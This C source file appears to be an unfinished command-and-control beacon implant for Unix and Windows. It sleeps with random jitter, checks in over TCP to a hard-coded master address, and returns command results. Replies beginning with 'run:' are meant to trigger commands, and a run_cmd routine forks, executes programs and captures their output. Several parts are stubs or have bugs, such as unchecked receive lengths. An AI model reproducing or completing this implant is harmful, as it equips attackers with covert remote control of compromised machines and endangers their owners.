#include <stdlib.h>
#include <stdio.h>
#include "beacon_client.h"

int main(int argc, char **argv){
    struct sockaddr_in master;
    char *data = NULL;
    master_init(&master);
    while ( 1 ) {
        #ifdef CLIENT_DEBUG
            int sleep_time = (rand() % 2) + 3;
            printf("Sleeping for %d seconds... ",sleep_time);
        #else
            int sleep_time = (rand() % SLEEP_MAX) + SLEEP_BASE;
        #endif

        #if defined(__apple__) || defined(__linux__) || defined(__unix__)
            sleep(sleep_time); //seconds
        #elif __windows__
            Sleep(sleep_time*1000); //seconds -> milliseconds
        #endif

        #ifdef CLIENT_DEBUG
            printf("Complete.\n");
        #endif

        // TODO Finish:
        // check-in to server & send back previous command results
        // if command
            // run command
            // save results to be sent back on next beacon
        char *resp = master_checkin(master, data);
        if (data)
            free(data);
        data = NULL;
        if (!strncmp(resp, "run:", 4)) {
            puts("Run command here");
            data = (char*)malloc(strlen("Triggered")+1);
            strcpy(data, "Triggered");
        }
        free(resp);
    }
    return 0;
}

/*
 * Initalize connection
 */
int master_init(struct sockaddr_in *master) {

    #if defined __apple__ || defined(__linux__) || defined(__unix__)
        memset(master, 0, sizeof(struct sockaddr_in));
        master->sin_family = AF_INET;
        master->sin_addr.s_addr = inet_addr( MASTER_IP );
        master->sin_port = htons(MASTER_PORT);
    #elif __windows__
        // TODO
    #endif
    return 0;
}

char *master_checkin(struct sockaddr_in master, char *data){
    char *server_reply = (char *)malloc(MASTER_RECV_SIZE);
    int recv_size;
    #if defined __apple__ || defined(__linux__) || defined(__unix__)
        // do standard sockets
        bzero(server_reply, MASTER_RECV_SIZE);
        int s;
        if ((s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
            #ifdef CLIENT_DEBUG
                printf("[master_checkin] Socket creation failed.");
            #endif
                return server_reply;
        }
        // Establish connection
        if (connect(s, (struct sockaddr *) &master, sizeof(master)) < 0) {
            #ifdef CLIENT_DEBUG
                printf("[master_checkin] Connect to master failed.");
            #endif
            return server_reply;
        }
        // Send data
        if(data && send(s , data , strlen(data) , 0) < 0) {
            return server_reply; //something failed :(
        }
        //Receive a reply from the server
        if((recv_size = recv(s , server_reply , MASTER_RECV_SIZE , 0)) < 0) {
            puts("recv failed");
        }
    #elif __windows__
        WSADATA wsa;
        SOCKET s;

        #ifdef CLIENT_DEBUG
            printf("[master_checkin] Initialising...");
        #endif
        if (WSAStartup(MAKEWORD(2,2),&wsa) != 0) {
            #ifdef CLIENT_DEBUG
                printf("Failed. Error: %d",WSAGetLastError());
            #endif
            return server_reply;
        }

        //Create a socket
        if((s = socket( AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET) {
            #ifdef CLIENT_DEBUG
                printf("Could not create socket : %d" , WSAGetLastError());
            #endif
            return server_reply;
        }

        // Connect to master
        if (connect(s , (struct sockaddr *)&master , sizeof(master)) < 0) {
            return server_reply;
        }

        // Send data
        if( send(s , data , strlen(data) , 0) == SOCKET_ERROR) {
            return server_reply;
        }
        //Receive a reply from the server
        if((recv_size = recv(s , server_reply , MASTER_RECV_SIZE , 0)) == SOCKET_ERROR) {
            puts("recv failed");
        }
        //Add a NULL terminating character to make it a proper string before printing
    #endif
    server_reply[recv_size] = '\0';
    return server_reply;
}

char *get_os() {
    return run_cmd(ID_CMD,NULL);
}

char *run_cmd(char *cmd,char **param) {
    int pipes[2];
    pid_t pid;
    char *buf = (char *)malloc(sizeof(char) * BUF_SIZE);
    if (pipe(pipes)==-1) {
        #ifdef CLIENT_DEBUG
            puts("[run_cmd] Failed to pipe.\n");
        #endif
        return NULL; // fail
    }
    if ((pid = fork()) == -1) {
        #ifdef CLIENT_DEBUG
            puts("[run_cmd] Failed to fork.\n");
        #endif
        return NULL; // fail
    }

    if(pid == 0) {
        // TODO: FIX from direct exec to
        // pipe->dup2->exec shell->write to stdin->send \n to stdin->read stdout save results->return results
        #if defined(__apple__) || defined(__linux__) || defined(__unix__)
            dup2(pipes[1], STDOUT_FILENO);
        #elif __windows__
            _dup2(pipes[1], STDOUT_FILENO);
        #endif
        close(pipes[0]);
        close(pipes[1]);
        #if defined(__apple__) || defined(__linux__) || defined(__unix__)
            if (param) {
                execv(cmd,param);
            } else {
                execl(cmd,"");
            }
        #elif __windows__
            _execv(cmd,param);
        #endif
    } else {
        close(pipes[1]);
        int nbytes = read(pipes[0], buf, BUF_SIZE);
        #ifdef CLIENT_DEBUG
            printf("[run_cmd] CMD ran: %s, Params[0]: %s, Output (%d bytes): %s\n", cmd, param[0], nbytes, buf);
        #endif
        wait(NULL);
    }
    return buf;
}
